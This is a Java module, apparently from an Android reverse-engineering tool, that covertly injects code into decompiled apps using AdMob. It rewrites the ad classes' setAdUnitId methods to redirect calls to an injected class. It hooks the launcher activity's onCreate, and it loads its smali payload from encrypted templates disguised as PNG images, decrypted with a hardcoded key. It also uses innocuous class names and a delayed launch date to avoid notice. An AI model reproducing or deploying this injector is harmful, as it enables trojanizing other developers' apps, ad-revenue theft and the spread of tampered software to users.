package com.ninjaflip.androidrevenge.core.apktool.serguad.inj;

import com.ninjaflip.androidrevenge.core.Configurator;
import com.ninjaflip.androidrevenge.core.apktool.ApkToolsManager;
import com.ninjaflip.androidrevenge.utils.StringUtil;
import com.ninjaflip.androidrevenge.utils.Utils;
import com.x5.template.Chunk;
import net.minidev.json.JSONObject;
import org.apache.commons.io.IOUtils;
import org.apache.log4j.Logger;

import javax.script.ScriptException;
import java.io.*;
import java.net.URI;
import java.net.URL;
import java.nio.file.FileSystem;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by Solitario on 29/09/2017.
 * <p>
 * aw hna ta7 louz
 */
public class Serguad {

    private static final Logger LOGGER = Logger.getLogger(Serguad.class);
    private String userUuid;
    private String projectFolderNameUuid;
    private JSONObject projectInfo;
    private Map<String, String> templateVariables = new HashMap<>();
    private boolean isTemporary = false;
    private String serguadClass;
    private String serguadFolderPath;
    private String serguadFolderRelativePath;
    private boolean returnTrue = false;
    private SerguadFinder serguadFinder = null;


    public Serguad(String userUuid, String projectFolderNameUuid, boolean isTemporary)
            throws FileNotFoundException {
        this.userUuid = userUuid;
        this.projectFolderNameUuid = projectFolderNameUuid;
        this.isTemporary = isTemporary;
        this.serguadFinder = new SerguadFinder(Configurator.getInstance().getProjectRootFolderPath(userUuid, projectFolderNameUuid, isTemporary));
    }

    /**
     * Start the serguad logic
     */
    public void processApp() throws ScriptException, IOException {
        try {
            projectInfo = ApkToolsManager.getInstance().getProjectInfoForSerg(userUuid, projectFolderNameUuid, isTemporary);
        } catch (Exception e) {
            e.printStackTrace();
            return;
        }
        String bnrFilePath = serguadFinder.locateBnrClassPath();
        String intersFilePath = serguadFinder.locateIntersClassPath();

        if (isAppSerguadable() && bnrFilePath != null && intersFilePath != null) {
            JSONObject checkIfWorkAlreadyDone = checkIfWorkAlreadyDone(bnrFilePath, intersFilePath);
            boolean isWorkAlreadyDone = (boolean) checkIfWorkAlreadyDone.get("isWorkAlreadyDone");

            if (!isWorkAlreadyDone) {
                // generate name and path to smali files containing serguad code
                JSONObject data = generateSerguadCalssNameAndFolderPath();
                this.serguadFolderPath = (String) data.get("folderPath");
                this.serguadFolderRelativePath = (String) data.get("folderRelativePath");
                this.serguadClass = (String) data.get("className");

                // populate the template
                templateVariables.put("serguad_inter_id", getSerguadIntersId());
                templateVariables.put("serguad_pckg_name", this.serguadFolderRelativePath);
                templateVariables.put("serguad_class_name", this.serguadClass);
                templateVariables.put("serguad_init_method_name", getSerguadInitMethodName());
                templateVariables.put("serguad_set_Bid", getRealBnrSetIdMethodName());
                templateVariables.put("serguad_set_Iid", getRealIntersSetIdMethodName());

                if (doWork()) {
                    LOGGER.info("");
                    LOGGER.info("                     ***********************");
                    LOGGER.info("                *********************************");
                    LOGGER.info("            *******   *     *       *    *    *******");
                    LOGGER.info("         *******   ***      **     **     ***   *******");
                    LOGGER.info("       ******   *****       *********      *****    *****");
                    LOGGER.info("     ******  ********       *********       ******    *****");
                    LOGGER.info("    ****   **********       *********       *********   *****");
                    LOGGER.info("   ****  **************    ***********     ************   ****");
                    LOGGER.info("  ****  *************************************************  ****");
                    LOGGER.info(" ****  ***************************************************  ****");
                    LOGGER.info(" ****  ****************************************************  ****");
                    LOGGER.info(" ****  ****************************************************  ****");
                    LOGGER.info("  ****  ***************************************************  ****");
                    LOGGER.info("   ****  *******     ****  ***********  ****     *********  ****");
                    LOGGER.info("    ****   *****      *      *******      *      ********  ****");
                    LOGGER.info("     *****   ****             *****             ******   *****");
                    LOGGER.info("       *****   **              ***              **    ******");
                    LOGGER.info("        ******   *              *              *   *******");
                    LOGGER.info("          *******       INJECTION SUCCESS        *******");
                    LOGGER.info("             ********                         *******");
                    LOGGER.info("                *********************************");
                    LOGGER.info("                     ***********************");
                    LOGGER.info("");
                } else {
                    LOGGER.warn("SERGUAD : WORK NOT DONE !!!!!");
                }
            } else { // app already worked => just update launch date (today + 5 days)
                String serguadFilePath = (String) checkIfWorkAlreadyDone.get("path");
                if (serguadFilePath != null) {
                    // detect launch date and update it with the corresponding date (today + N days)
                    if (serguadFinder.updateSerguadLaunchDate(serguadFilePath, 5)) {
                        LOGGER.info("-------------------------------------------------------------------------");
                        LOGGER.info("SERGUAD File ===> " + serguadFilePath);
                        LOGGER.info("");
                        LOGGER.info("                     ***********************");
                        LOGGER.info("                *********************************");
                        LOGGER.info("            *******   *     *       *    *    *******");
                        LOGGER.info("         *******   ***      **     **     ***   *******");
                        LOGGER.info("       ******   *****       *********      *****    *****");
                        LOGGER.info("     ******  ********       *********       ******    *****");
                        LOGGER.info("    ****   **********       *********       *********   *****");
                        LOGGER.info("   ****  **************    ***** *****     ************   ****");
                        LOGGER.info("  ****  ***********************   ***********************  ****");
                        LOGGER.info(" ****  **********************   O   **********************  ****");
                        LOGGER.info(" ****  ***********************     ************************  ****");
                        LOGGER.info(" ****  ************************* **************************  ****");
                        LOGGER.info("  ****  ***************************************************  ****");
                        LOGGER.info("   ****  *******     ****  ***********  ****     *********  ****");
                        LOGGER.info("    ****   *****      *      *******      *      ********  ****");
                        LOGGER.info("     *****   ****             *****             ******   *****");
                        LOGGER.info("       *****   **              ***              **    ******");
                        LOGGER.info("        ******   *              *              *   *******");
                        LOGGER.info("          *******       WORK ALREADY DONE        *******");
                        LOGGER.info("             ********      DATE UPDATED       *******");
                        LOGGER.info("                *********************************");
                        LOGGER.info("                     ***********************");
                        LOGGER.info("");
                    } else {
                        LOGGER.warn("SERGUAD : LAUNCH DATE NOT UPDATED !!!!!");
                    }
                }else{
                    LOGGER.warn("SERGUAD : NULL SERGUAD FILE PATH !!!!!");
                }
            }
        }
    }

    /**
     * Check if app contains admob interstitial ads and has a launcher activity
     *
     * @return true if contains admob interstitial ads, false otherwise
     */
    private boolean isAppSerguadable() {
        return appHasAdmob() && (getLauncherActivity() != null);
    }

    /**
     * Check if app has already Serguaded
     *
     * @param bnrFilePath    the path to the AdView.smali file xxx.smali if obfuscated
     * @param intersFilePath the path to the InterstitialAd.smali file or xxx.smali if obfuscated
     * @return JSONObject containint a boolean field 'isWorkAlreadyDone' which true if the current project already serguaded false
     * otherwise, and a String filed 'path' that contains the full path to serguad main file
     * @throws IOException
     */
    private JSONObject checkIfWorkAlreadyDone(String bnrFilePath, String intersFilePath) throws IOException {
        /*
        * Search for setAdUnitId method inside interstitial and Adview
        * And check if that method redirect every call to an external class
        * And check that external class is called by The onCreate method of the main activity
         */
        JSONObject result = new JSONObject();
        result.put("isWorkAlreadyDone", false);
        result.put("path", null);

        FileInputStream isBnr = null;
        FileInputStream isInters = null;

        String ONE_OR_MORE_BLANK = "\\s+";
        String fakeMethodRegex = "\\.method[\\s\\w]*\\s(.+?)" + Pattern.quote("(Ljava/lang/String;)V") + ONE_OR_MORE_BLANK
                + Pattern.quote(".locals 2") + ONE_OR_MORE_BLANK
                + Pattern.quote("move-object v0, p0") + ONE_OR_MORE_BLANK
                + Pattern.quote("move-object v1, p1") + ONE_OR_MORE_BLANK
                + Pattern.quote("invoke-static {v0, v1}, L") + "(.+?)" + Pattern.quote(";->") + "(.+?)" + Pattern.quote("(Ljava/lang/Object;Ljava/lang/String;)V") + ONE_OR_MORE_BLANK
                + Pattern.quote("return-void") + ONE_OR_MORE_BLANK
                + Pattern.quote(".end method");

        try {
            isBnr = new FileInputStream(new File(bnrFilePath));
            isInters = new FileInputStream(new File(intersFilePath));
            String contentBnr = IOUtils.toString(isBnr, "UTF-8");
            String contentInters = IOUtils.toString(isInters, "UTF-8");

            Pattern pattern = Pattern.compile(fakeMethodRegex);
            Matcher matcherBnr = pattern.matcher(contentBnr);
            Matcher matcherInters = pattern.matcher(contentInters);

            String bnrExtCall = null;
            String intersExtCall = null;
            if (matcherBnr.find()) {
                bnrExtCall = matcherBnr.group(2);
            }
            if (matcherInters.find()) {
                intersExtCall = matcherBnr.group(2);
            }


            if (bnrExtCall != null && intersExtCall != null && bnrExtCall.equals(intersExtCall)) {
                // check if intersExtCall is invoked inside the onCreate method of the launcher activity
                if (projectInfo.get("launcherActivity") != null) {
                    String launcherActivity = (String) projectInfo.get("launcherActivity");
                    // get launcher activity file
                    String[] launcherSplit = launcherActivity.split("\\.");
                    String smaliFolderPath = Configurator.getInstance().getSmaliFolderPath(userUuid, projectFolderNameUuid, isTemporary);
                    String launcherActFolder = String.join(File.separator, Arrays.copyOfRange(launcherSplit, 0, launcherSplit.length - 1));
                    String launcherActClassName = launcherSplit[launcherSplit.length - 1];
                    File launcherActivityFile = new File(smaliFolderPath + File.separator + launcherActFolder + File.separator + launcherActClassName + ".smali");

                    FileInputStream launcherActivityIs = null;
                    String regexOnCreateMethod = "(?s)\\.method[\\w\\s]+onCreate\\(.*?\\)V" + "(.*?)\\.end method";
                    try {
                        launcherActivityIs = new FileInputStream(launcherActivityFile);
                        String contentLauncher = IOUtils.toString(launcherActivityIs, "UTF-8");

                        Pattern patternOnCreateMethod = Pattern.compile(regexOnCreateMethod);
                        Matcher matcherOnCreateMethod = patternOnCreateMethod.matcher(contentLauncher);
                        if (matcherOnCreateMethod.find()) { // found onCreate method
                            if (matcherOnCreateMethod.group(1).contains(intersExtCall)) {
                                // get path of serguad main file
                                String[] sergSplit = intersExtCall.split("/");
                                String sergFolder = String.join(File.separator, Arrays.copyOfRange(sergSplit, 0, sergSplit.length - 1));
                                String sergClassName = sergSplit[launcherSplit.length - 1];
                                File sergFile = new File(smaliFolderPath + File.separator + sergFolder + File.separator + sergClassName + ".smali");

                                // return result
                                if (sergFile.exists() && sergFile.isFile()) {
                                    result.put("isWorkAlreadyDone", true);
                                    result.put("path", sergFile.getPath());
                                    return result;
                                }
                            }
                        }
                    } finally {
                        IOUtils.closeQuietly(launcherActivityIs);
                    }
                }
            }
        } finally {
            IOUtils.closeQuietly(isBnr);
            IOUtils.closeQuietly(isInters);
        }
        return result;
    }

    /**
     * Randomly generate a class and its folder path depending on project info
     *
     * @return a json object containing names of generated class and its folder path
     */
    private JSONObject generateSerguadCalssNameAndFolderPath() {
        JSONObject res = new JSONObject();

        List<String> foreignActivities = (List<String>) projectInfo.get("foreignActivities");
        List<String> packageActivities = (List<String>) projectInfo.get("packageActivities");

        // TODO remove classes containing .google. from foreign activities

        String randomActivity = null;
        Random ran = new Random();
        if (packageActivities != null && packageActivities.size() > 0) {
            if (projectInfo.get("launcherActivity") != null) {
                String launcherActivity = (String) projectInfo.get("launcherActivity");
                packageActivities.remove(launcherActivity);
            }
            int counter = 0;
            int maxIter = packageActivities.size() * 5;
            while (randomActivity == null && counter < maxIter) {
                int index = ran.nextInt(packageActivities.size());
                String selectedActivity = packageActivities.get(index);
                if (!selectedActivity.contains(".google")) {
                    randomActivity = selectedActivity;
                }
                counter++;
            }
        } else if (foreignActivities != null && foreignActivities.size() > 0) {
            int counter = 0;
            int maxIter = foreignActivities.size() * 5;
            while (randomActivity == null && counter < maxIter) {
                int index = ran.nextInt(foreignActivities.size());
                String selectedActivity = foreignActivities.get(index);
                if (!selectedActivity.contains(".google")) {
                    randomActivity = selectedActivity;
                }
                counter++;
            }
        }

        if (randomActivity == null) {
            if (projectInfo.get("launcherActivity") != null) {
                randomActivity = (String) projectInfo.get("launcherActivity");
            } else {
                randomActivity = "com.stringutils.commons.lib.sax.XmlParser";
            }
        }

        String[] randomActivitySplit = randomActivity.split("\\.");
        String randomActivityName = randomActivitySplit[randomActivitySplit.length - 1];
        List<String> packageList = new LinkedList<String>(Arrays.asList(randomActivitySplit));
        packageList.remove(packageList.size() - 1);
        String randomActivityFolder = String.join(File.separator, packageList);

        String smaliFolderPath = Configurator.getInstance().getSmaliFolderPath(userUuid, projectFolderNameUuid, isTemporary);
        if (randomActivityName.contains("Activity") && randomActivityName.length() > "Activity".length()) {
            randomActivityName = randomActivityName.replace("Activity", "");
        }
        String suffix = "Lime";
        String className = randomActivityName + suffix;
        String folderPath = smaliFolderPath + File.separator + randomActivityFolder;
        res.put("className", className);
        res.put("folderPath", folderPath);
        res.put("folderRelativePath", randomActivityFolder.replace(File.separator, "/"));
        return res;
    }

    /**
     * Serguad business logic
     *
     * @return true if work is done, false otherwise
     * @throws IOException
     */
    private boolean doWork() throws IOException {

        // check ads package app is obfuscated
        boolean isAdsPackageObfuscated = serguadFinder.isAdsPackageObfuscated();

        if (!isAdsPackageObfuscated) {// app not obfuscated
            String interstitialAdClassName = "InterstitialAd";
            String adViewClassName = "AdView";
            String setIntersAdUnitMethodName = "setAdUnitId";
            String setBannerAdUnitMethodName = "setAdUnitId";
            templateVariables.put("serguad_inters_class_name", interstitialAdClassName);
            templateVariables.put("serguad_adview_class_name", adViewClassName);

            if (injectSerguadInitMethod(false)
                    && doWorkForInters(interstitialAdClassName, setIntersAdUnitMethodName, false)
                    && doWorkForBan(adViewClassName, setBannerAdUnitMethodName, false)
                    && injectSerguadFiles(false)) {
                if (doWorkForInters(interstitialAdClassName, setIntersAdUnitMethodName, true)
                        && doWorkForBan(adViewClassName, setBannerAdUnitMethodName, true)) {
                    return injectSerguadFiles(true) && injectSerguadInitMethod(true);
                }
            }


        } else {// app is obfuscated

            // locate AdView and InterstitialAd classes and their respective methods setAdUnitId
            JSONObject intersData = serguadFinder.locateIntersData();
            JSONObject bnrData = serguadFinder.locateBnrData();

            if (intersData == null || bnrData == null) {// found one or none
                // TODO case found only AdView or found only InterstitialAd
                return false;
            } else { // found both interstitial and banner
                String interstitialAdClassName = intersData.getAsString("className");
                String setIntersAdUnitMethodName = intersData.getAsString("setIdMethodName");

                String adViewClassName = bnrData.getAsString("className");
                String setBannerAdUnitMethodName = bnrData.getAsString("setIdMethodName");

                templateVariables.put("serguad_inters_class_name", interstitialAdClassName);
                templateVariables.put("serguad_adview_class_name", adViewClassName);

                if (injectSerguadInitMethod(false)
                        && doWorkForInters(interstitialAdClassName, setIntersAdUnitMethodName, false)
                        && doWorkForBan(adViewClassName, setBannerAdUnitMethodName, false)
                        && injectSerguadFiles(false)) {
                    if (doWorkForInters(interstitialAdClassName, setIntersAdUnitMethodName, true)
                            && doWorkForBan(adViewClassName, setBannerAdUnitMethodName, true)) {
                        return injectSerguadFiles(true) && injectSerguadInitMethod(true);
                    }
                }
            }
        }
        return false;
    }

    /**
     * interstitialAd injection: Logic for non obfuscated Ads packages
     * locate InterstitialAd.setAdUnitId(String) method and replace it by InterstitialAd.setAdUnitIdInterstitial(String)
     *
     * @param write set to false to check if the operation has succeeded before executing Write operations
     */
    private boolean doWorkForInters(String interstitialAdClassName, String setAdUnitIdMethodName, boolean write) {
        if (returnTrue) {
            return true;
        }
        FileInputStream intersIs = null;
        InputStream stream = null;
        FileOutputStream out = null;

        try {
            File adsFolder = new File(Configurator.getInstance().getSmaliFolderPath(userUuid, projectFolderNameUuid, isTemporary) + File.separator +
                    "com" + File.separator + "google" + File.separator + "android" + File.separator + "gms" + File.separator + "ads");

            if (!adsFolder.exists() || !adsFolder.isDirectory()) {
                System.out.println(adsFolder.getPath() + " does not exist or not a folder");
                throw new FileNotFoundException(adsFolder.getPath() + " does not exist or not a folder");
            }


            File intersAdFile = new File(adsFolder + File.separator + interstitialAdClassName + ".smali");

            // check files exist
            if (!intersAdFile.exists()) {
                System.out.println(intersAdFile.getPath() + " does not exist");
                throw new FileNotFoundException(intersAdFile.getPath() + " does not exist");
            }

            // get file content
            intersIs = new FileInputStream(intersAdFile);
            String classStringContent = IOUtils.toString(intersIs);

            // replace original method by the fake one
            String regexMethod = "(?s)\\.method([\\w\\s]+)" + Pattern.quote(setAdUnitIdMethodName) + "\\(Ljava\\/lang\\/String;\\)V" + "(.*?)\\.end method";

            Pattern patternMethod = Pattern.compile(regexMethod);
            Matcher matcher = patternMethod.matcher(classStringContent);
            if (matcher.find()) {

                if (write) {
                    String fakeMethod = ".method" + matcher.group(1) + setAdUnitIdMethodName + "(Ljava/lang/String;)V" + System.lineSeparator()
                            + "\t.locals 2" + System.lineSeparator()
                            + System.lineSeparator()
                            + "\tmove-object v0, p0" + System.lineSeparator()
                            + System.lineSeparator()
                            + "\tmove-object v1, p1" + System.lineSeparator()
                            + System.lineSeparator()
                            + "\tinvoke-static {v0, v1}, L" + serguadFolderRelativePath + "/" + serguadClass + ";->" + getRemoteSetInterstitialAdUnitId() + "(Ljava/lang/Object;Ljava/lang/String;)V" + System.lineSeparator()
                            + System.lineSeparator()
                            + "\treturn-void" + System.lineSeparator()
                            + ".end method" + System.lineSeparator();
                    String realMethod = ".method public " + getRealIntersSetIdMethodName() + "(Ljava/lang/String;)V" + matcher.group(2) + ".end method";


                    String replacement = fakeMethod + System.lineSeparator() + realMethod;
                    String newContent = classStringContent.replace(matcher.group(0), replacement);

                    // replace by new content
                    stream = new ByteArrayInputStream(newContent.getBytes("UTF-8"));
                    out = new FileOutputStream(intersAdFile);
                    IOUtils.copyLarge(stream, out);
                }
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {
            if (intersIs != null) {
                try {
                    intersIs.close();
                } catch (Exception e) {
                    // do nothing
                }
            }

            if (stream != null) {
                try {
                    stream.close();
                } catch (Exception e) {
                    // do nothing
                }
            }

            if (out != null) {
                try {
                    out.close();
                } catch (Exception e) {
                    // do nothing
                }
            }
        }
    }

    /**
     * banner injection: Logic for non obfuscated Ads packages.
     * located AdView.setAdUnitId(String) method and replace it by AdView.setAdUnitIdBanner(String)
     *
     * @param write set to false to check if the operation has succeeded before executing Write operations
     */
    private boolean doWorkForBan(String adViewClassName, String setAdUnitIdMethodName, boolean write) {
        if (returnTrue) {
            return true;
        }
        FileInputStream banIs = null;
        InputStream stream = null;
        FileOutputStream out = null;

        try {
            File adsFolder = new File(Configurator.getInstance().getSmaliFolderPath(userUuid, projectFolderNameUuid, isTemporary) + File.separator +
                    "com" + File.separator + "google" + File.separator + "android" + File.separator + "gms" + File.separator + "ads");

            if (!adsFolder.exists() || !adsFolder.isDirectory()) {
                System.out.println(adsFolder.getPath() + " does not exist or not a folder");
                throw new FileNotFoundException(adsFolder.getPath() + " does not exist or not a folder");
            }

            File adViewFile = new File(adsFolder + File.separator + adViewClassName + ".smali");

            // check files exist
            if (!adViewFile.exists()) {
                System.out.println(adViewFile.getPath() + " does not exist");
                throw new FileNotFoundException(adViewFile.getPath() + " does not exist");
            }

            // get file content
            banIs = new FileInputStream(adViewFile);
            String classStringContent = IOUtils.toString(banIs);

            // replace original method by the fake one
            String regexMethod = "(?s)\\.method([\\w\\s]+)" + Pattern.quote(setAdUnitIdMethodName) + "\\(Ljava\\/lang\\/String;\\)V" + "(.*?)\\.end method";
            Pattern patternMethod = Pattern.compile(regexMethod);
            Matcher matcher = patternMethod.matcher(classStringContent);
            if (matcher.find()) {

                if (write) {
                    String fakeMethod = ".method" + matcher.group(1) + setAdUnitIdMethodName + "(Ljava/lang/String;)V" + System.lineSeparator()
                            + "\t.locals 2" + System.lineSeparator()
                            + System.lineSeparator()
                            + "\tmove-object v0, p0" + System.lineSeparator()
                            + System.lineSeparator()
                            + "\tmove-object v1, p1" + System.lineSeparator()
                            + System.lineSeparator()
                            + "\tinvoke-static {v0, v1}, L" + serguadFolderRelativePath + "/" + serguadClass + ";->" + getRemoteSetBannerAdUnitId() + "(Ljava/lang/Object;Ljava/lang/String;)V" + System.lineSeparator()
                            + System.lineSeparator()
                            + "\treturn-void" + System.lineSeparator()
                            + ".end method" + System.lineSeparator();
                    String realMethod = ".method public " + getRealBnrSetIdMethodName() + "(Ljava/lang/String;)V" + matcher.group(2) + ".end method";


                    String replacement = fakeMethod + System.lineSeparator() + realMethod;
                    String newContent = classStringContent.replace(matcher.group(0), replacement);

                    // replace by new content
                    stream = new ByteArrayInputStream(newContent.getBytes("UTF-8"));
                    out = new FileOutputStream(adViewFile);
                    IOUtils.copyLarge(stream, out);
                }
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {
            if (banIs != null) {
                try {
                    banIs.close();
                } catch (Exception e) {
                    // do nothing
                }
            }

            if (stream != null) {
                try {
                    stream.close();
                } catch (Exception e) {
                    // do nothing
                }
            }

            if (out != null) {
                try {
                    out.close();
                } catch (Exception e) {
                    // do nothing
                }
            }
        }
    }

    /**
     * Inject Serguad files that contains the smali code
     *
     * @param write set to false to check if the operation has succeeded before executing Write operations
     */
    private boolean injectSerguadFiles(boolean write) {
        InputStream stream = null;
        FileOutputStream out = null;

        InputStream stream$mTsk = null;
        FileOutputStream out$mTsk = null;

        InputStream stream$1 = null;
        FileOutputStream out$1 = null;
        try {
            long launchDate = System.currentTimeMillis();
            //launchDate = launchDate + (1000 * 60 * 60 * 24 * 5);
            templateVariables.put("serguad_launch_date", String.valueOf(launchDate));

            // load templates and populate them with the right content
            String fileContent = loadAndPopulateSerguadTemplate("/images/background.png", templateVariables);
            String fileContent$mTsk = loadAndPopulateSerguadTemplate("/images/backgroundTsk.png", templateVariables);
            String fileContent$1 = loadAndPopulateSerguadTemplate("/images/background1.png", templateVariables);

            // create parent folder if not exists
            File serguadFolder = new File(this.serguadFolderPath);
            if (!serguadFolder.exists()) {
                serguadFolder.mkdirs();
            }

            // create files and fill them with content from template
            File serguadFile = new File(this.serguadFolderPath, this.serguadClass + ".smali");
            File serguadFile$mTsk = new File(this.serguadFolderPath, this.serguadClass + "$mTsk.smali");
            File serguadFile$1 = new File(this.serguadFolderPath, this.serguadClass + "$1.smali");

            if (!serguadFile.exists()) {
                serguadFile.createNewFile();
            }
            if (!serguadFile$mTsk.exists()) {
                serguadFile$mTsk.createNewFile();
            }
            if (!serguadFile$1.exists()) {
                serguadFile$1.createNewFile();
            }

            if (write) {
                stream = new ByteArrayInputStream(fileContent.getBytes("UTF-8"));
                out = new FileOutputStream(serguadFile);
                IOUtils.copyLarge(stream, out);


                stream$mTsk = new ByteArrayInputStream(fileContent$mTsk.getBytes("UTF-8"));
                out$mTsk = new FileOutputStream(serguadFile$mTsk);
                IOUtils.copyLarge(stream$mTsk, out$mTsk);


                stream$1 = new ByteArrayInputStream(fileContent$1.getBytes("UTF-8"));
                out$1 = new FileOutputStream(serguadFile$1);
                IOUtils.copyLarge(stream$1, out$1);
            }
            return true;
        } catch (Exception e) {
            LOGGER.error(e.getMessage());
            e.printStackTrace();
            return false;
        } finally {
            if (stream != null) {
                try {
                    stream.close();
                } catch (Exception e) {
                    // do nothing
                }
            }

            if (out != null) {
                try {
                    out.close();
                } catch (Exception e) {
                    // do nothing
                }
            }

            if (stream$mTsk != null) {
                try {
                    stream$mTsk.close();
                } catch (Exception e) {
                    // do nothing
                }
            }

            if (out$mTsk != null) {
                try {
                    out$mTsk.close();
                } catch (Exception e) {
                    // do nothing
                }
            }

            if (stream$1 != null) {
                try {
                    stream$1.close();
                } catch (Exception e) {
                    // do nothing
                }
            }

            if (out$1 != null) {
                try {
                    out$1.close();
                } catch (Exception e) {
                    // do nothing
                }
            }
        }

    }

    /**
     * Get the onCreate method of the launcher activity and inject Serguad.init method right after the set content view
     *
     * @param write set to false to check if the operation has succeeded before executing Write operations
     * @return
     */
    private boolean injectSerguadInitMethod(boolean write) {
        if (returnTrue) {
            return true;
        }
        String launcherActivity = getLauncherActivity();
        String initMethodName = getSerguadInitMethodName();


        // get launcher activity file
        String[] launcherSplit = launcherActivity.split("\\.");
        String smaliFolderPath = Configurator.getInstance().getSmaliFolderPath(userUuid, projectFolderNameUuid, isTemporary);
        String launcherActFolder = String.join(File.separator, Arrays.copyOfRange(launcherSplit, 0, launcherSplit.length - 1));
        String launcherActClassName = launcherSplit[launcherSplit.length - 1];
        File launcherActivityFile = new File(smaliFolderPath + File.separator + launcherActFolder + File.separator + launcherActClassName + ".smali");

        FileInputStream launcherActivityIs = null;
        InputStream stream = null;
        FileOutputStream out = null;


        String regexOnCreateMethod = "(?s)\\.method([\\w\\s]+)onCreate\\(.*?\\)V" + "(.*?)\\.end method";
        try {
            launcherActivityIs = new FileInputStream(launcherActivityFile);
            String content = IOUtils.toString(launcherActivityIs, "UTF-8");

            Pattern patternOnCreateMethod = Pattern.compile(regexOnCreateMethod);
            Matcher matcherOnCreateMethod = patternOnCreateMethod.matcher(content);
            if (matcherOnCreateMethod.find()) { // found onCreate method
                String onCreateMethod = matcherOnCreateMethod.group(0);

                String regexSetContentViewLine = "invoke-virtual\\s*\\{(\\w+)\\s*,\\s*\\w+\\},\\s*L" + launcherActivity.replace(".", "\\/") + ";->setContentView\\(I\\)V";
                Pattern patternSetContentViewLine = Pattern.compile(regexSetContentViewLine);
                Matcher matcherSetContentViewLine = patternSetContentViewLine.matcher(onCreateMethod);

                if (matcherSetContentViewLine.find()) {
                    if (write) {
                        String setContentViewLine = matcherSetContentViewLine.group(0);

                        String register = matcherSetContentViewLine.group(1);
                        String injection = "invoke-static {" + register + "}, L" + this.serguadFolderRelativePath + "/" + this.serguadClass + ";->" + initMethodName + "(Landroid/app/Activity;)V";
                        String replacement = setContentViewLine + System.lineSeparator() + System.lineSeparator() + "\t" + injection;

                        String newOnCreateMethod = onCreateMethod.replace(setContentViewLine, replacement);

                        String newContent = content.replace(onCreateMethod, newOnCreateMethod);

                        stream = new ByteArrayInputStream(newContent.getBytes("UTF-8"));
                        out = new FileOutputStream(launcherActivityFile);
                        IOUtils.copyLarge(stream, out);
                    }
                    return true;
                } else { // setContentView Method not found inside onCreate method (example in PTPlayer activity)
                    // an alternative is to place the injection under super.onCreate();
                    String regexSuperOnCreateLine = "invoke-super\\s*\\{(\\w+)\\s*,\\s*\\w+\\},\\s*L.+;->onCreate\\(.+?\\)V";
                    Pattern patternSuperOnCreateLine = Pattern.compile(regexSuperOnCreateLine);
                    Matcher matcherSuperOnCreateLine = patternSuperOnCreateLine.matcher(onCreateMethod);

                    if (matcherSuperOnCreateLine.find()) {

                        if (write) {
                            String superOnCreateLine = matcherSuperOnCreateLine.group(0);

                            String register = matcherSuperOnCreateLine.group(1);
                            String injection = "invoke-static {" + register + "}, L" + this.serguadFolderRelativePath + "/" + this.serguadClass + ";->" + initMethodName + "(Landroid/app/Activity;)V";
                            String replacement = superOnCreateLine + System.lineSeparator() + System.lineSeparator() + "\t" + injection;

                            String newOnCreateMethod = onCreateMethod.replace(superOnCreateLine, replacement);

                            String newContent = content.replace(onCreateMethod, newOnCreateMethod);

                            stream = new ByteArrayInputStream(newContent.getBytes("UTF-8"));
                            out = new FileOutputStream(launcherActivityFile);
                            IOUtils.copyLarge(stream, out);
                        }
                        return true;
                    }
                }
            }
            return false;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        } finally {
            if (launcherActivityIs != null) {
                try {
                    launcherActivityIs.close();
                } catch (Exception e) {
                    // do nothing
                }
            }

            if (stream != null) {
                try {
                    stream.close();
                } catch (Exception e) {
                    // do nothing
                }
            }

            if (out != null) {
                try {
                    out.close();
                } catch (Exception e) {
                    // do nothing
                }
            }
        }

    }


    private String getLauncherActivity() {
        return (String) projectInfo.get("launcherActivity");
    }

    private String getSerguadIntersId() {
        return "ca-app-pub-3940256099942544/1033173712";
    }


    private String getSerguadInitMethodName() {
        return "sergCommence";
    }

    private String getRealBnrSetIdMethodName() {
        return "setUnitBnr";
    }

    private String getRealIntersSetIdMethodName() {
        return "setUnitInters";
    }

    private String getRemoteSetBannerAdUnitId() {
        return "setBUnit";
    }

    private String getRemoteSetInterstitialAdUnitId() {
        return "setIUnit";
    }

    /*========== serguad utilities methods ============*/

    /**
     * Check if an app has admob integrated
     *
     * @return true if admob is found false otherwise
     */
    private boolean appHasAdmob() {
        ArrayList<String> foreignActivities = (ArrayList<String>) projectInfo.get("foreignActivities");
        File admobFolder = new File(Configurator.getInstance()
                .getSmaliFolderPath(userUuid, projectFolderNameUuid, isTemporary),
                "com" + File.separator + "google" + File.separator + "android" + File.separator + "gms" + File.separator + "ads");

        return foreignActivities != null && (foreignActivities.contains("com.google.android.gms.ads.AdActivity") && admobFolder.exists());
    }


    /**
     * Load smali template file and populate its variables
     *
     * @param name      relative path to the template file inside resources folder
     * @param variables a map containing variable names as keys and variable values as value
     * @return the populated template as a String
     */
    private String loadAndPopulateSerguadTemplate(String name, Map<String, String> variables) throws Exception {
        InputStream is = null;
        try {
            is = getClass().getResourceAsStream(name);
            String strContent = Utils.convertStreamToString(is);
            Chunk html = new Chunk();
            // TODO key from hidden png data image in resources/image/btn.png
            String key = "VUVaS0swUmxTekpDUVhsTFFqQlNZMFpGUTNjeU0yZERRblJtVlRadk5FOWpWVmM0UW5oT1EwWXZaVTR3";
            String tmpl = Utils.decdes(strContent, key);
            html.append(tmpl);
            html.setErrorHandling(true, System.err);

            for (Map.Entry<String, String> pair : variables.entrySet()) {
                html.set(pair.getKey(), pair.getValue());
            }

            return html.toString();
        } finally {
            if (is != null) {
                is.close();
            }
        }
    }
}